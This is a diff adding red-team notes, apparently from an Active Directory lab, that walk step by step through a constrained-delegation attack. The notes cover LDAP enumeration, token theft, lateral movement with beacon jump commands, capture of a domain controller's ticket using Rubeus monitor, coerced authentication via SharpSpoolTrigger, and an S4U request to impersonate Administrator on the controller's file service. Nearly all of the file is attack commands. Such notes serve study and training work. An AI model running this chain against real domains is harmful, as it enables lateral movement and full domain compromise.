@@ -1,0 +1,28 @@
+use LDAP to find users with constrained delegation (where the AllowedToDelegateTo attribute is not null)
+    ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
+
+we see LON-WS-1$ is AllowedToDelegateTo to cifs (file server) and has a non-default UAC value
+check that the TRUSTED_TO_AUTH_FOR_DELEGATION flag is set
+    powershell> [Convert]::ToBoolean(16781312 -band 16777216)
+
+we verify that protocol transition is enabled
+
+move laterally to the web server
+    steal token from rsteel
+    beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
+    beacon> jump scshell64 lon-ws-1 smb
+
+now interact with the web server beacon 
+    spawnto x64 %windir%\sysnative\werfault.exe
+
+now monitor via rubeus
+    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:3 /targetuser:lon-dc-1$ /nowrap
+
+now force the computer auth
+    beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe lon-dc-1 lon-ws-1
+
+store the ticket and kill rubeus monitor
+    beacon> jobkill 0
+
+computers dont get access the way users day, so now use krb_s4u to get a usable service ticket
+    beacon> krb_s4u /ticket:[TGT] /self /altservice:cifs/lon-dc-1 /impersonateuser:Administrator
